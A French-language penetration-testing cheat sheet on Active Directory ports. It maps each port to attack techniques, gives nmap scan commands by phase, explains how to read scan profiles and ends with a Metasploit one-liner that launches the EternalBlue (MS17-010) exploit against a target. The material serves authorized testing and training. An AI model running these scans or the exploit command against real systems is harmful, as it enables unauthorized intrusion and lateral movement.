# Cheatsheet : Ports Active Directory

---

## Ports AD critiques (à scanner en priorité)

| Port | Protocole | Service | Signification & Action en pentest |
|------|-----------|---------|----------------------------------|
| **88** | TCP/UDP | **Kerberos** | **Port signature d'un DC.** Kerberoasting, AS-REP, Golden/Silver Ticket |
| **389** | TCP/UDP | **LDAP** | Annuaire AD. BloodHound, ldapdomaindump, énumération |
| **636** | TCP | **LDAPS** | LDAP chiffré. Relay ntlmrelayx, certipy |
| **445** | TCP | **SMB** | Partages, PtH, relay, psexec, dump SAM/LSA |
| **3268** | TCP | **Global Catalog** | DC principal. Requêtes cross-domaine |
| **3269** | TCP | **Global Catalog SSL** | GC chiffré |
| **53** | TCP/UDP | **DNS** | Résolution noms AD. Zone transfer (`dig axfr`) |
| **5985** | TCP | **WinRM HTTP** | PowerShell remoting. evil-winrm, nxc winrm |
| **5986** | TCP | **WinRM HTTPS** | WinRM chiffré |
| **3389** | TCP | **RDP** | Bureau à distance |
| **139** | TCP | **NetBIOS-SSN** | SMB legacy + énumération |
| **137/138** | UDP | **NetBIOS** | Résolution de noms. LLMNR/NBT-NS (Responder) |
| **464** | TCP/UDP | **Kpasswd** | Changement de mot de passe Kerberos |
| **135** | TCP | **RPC Endpoint Mapper** | WMI, wmiexec, RPC |

---

## Ports services courants (sur serveurs membres)

| Port | Service | Action en pentest |
|------|---------|------------------|
| **1433** | **MSSQL** | `nxc mssql`, `mssqlclient.py`, xp_cmdshell |
| **1521** | Oracle DB | Accès DB |
| **3306** | MySQL | Accès DB |
| **80/443** | HTTP/HTTPS | Web apps, ADCS (`/certsrv/`) |
| **8080/8443** | HTTP alt | Tomcat (manager), JBoss |
| **22** | SSH | Accès direct |
| **23** | Telnet | Rare mais existe |
| **25** | SMTP | Serveur mail |
| **110** | POP3 | Messagerie |
| **143** | IMAP | Messagerie |

---

## Ports spécifiques à ADCS (Certificate Services)

| Port | Service | Technique |
|------|---------|-----------|
| **80** | HTTP certsrv | ESC8 : relay NTLM vers ADCS |
| **443** | HTTPS certsrv | Enrollment HTTPS |
| **135** | RPC DCOM | Enrollment via RPC |

```bash
# Trouver l'interface ADCS
curl http://$CA_SERVER/certsrv/
```

---

## Commande de scan par phase

### Découverte rapide (Phase 1)

```bash
# Trouver tous les DC du réseau
nmap -p 88 --open $RANGE

# Scan rapide des ports AD essentiels
nmap -Pn -p 53,88,135,139,389,445,636,3268,5985,3389 $RANGE --open
```

### Scan approfondi d'une machine

```bash
# Tous les ports AD + versions
nmap -Pn -sC -sV \
    -p 53,88,135,139,389,445,464,636,3268,3269,3389,5985,5986 \
    $TARGET -oA ~/certif/scans/target_full

# Tous les ports (exhaustif)
nmap -Pn -sV -p- $TARGET -oA ~/certif/scans/target_allports
```

### Scan de vulnérabilités SMB

```bash
nmap -Pn --script smb-vuln* -p 139,445 $RANGE
```

---

## Interprétation des résultats

### Profil d'un DC

```
88/tcp   open  kerberos-sec     ← DC confirmé
389/tcp  open  ldap             ← Annuaire AD
445/tcp  open  microsoft-ds     ← SMB
636/tcp  open  ldapssl          ← LDAP sécurisé
3268/tcp open  globalcatLDAP    ← Global Catalog
3269/tcp open  globalcatLDAPssl ← GC sécurisé
5985/tcp open  http (WinRM)     ← Admin distance
```

### Profil d'un serveur membre (admin)

```
135/tcp  open  msrpc    ← WMI, RPC
139/tcp  open  netbios  ← SMB legacy
445/tcp  open  smb      ← Partages, mouvement latéral
5985/tcp open  winrm    ← PowerShell remoting
3389/tcp open  rdp      ← Bureau à distance
```

### Profil d'un serveur SQL

```
1433/tcp open  ms-sql-s  ← Accès MSSQL, xp_cmdshell possible
445/tcp  open  smb       ← Mouvement latéral
```

---

## Signatures EternalBlue (MS17-010)

Si le scan remonte ces vulnérabilités SMB :

```
smb-vuln-ms17-010: VULNERABLE
  State: VULNERABLE
  Risk factor: HIGH
```

```bash
# Vérification
nmap -Pn --script smb-vuln-ms17-010 -p 445 $TARGET

# Exploitation via Metasploit
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; \
    set RHOSTS $TARGET; run"
```
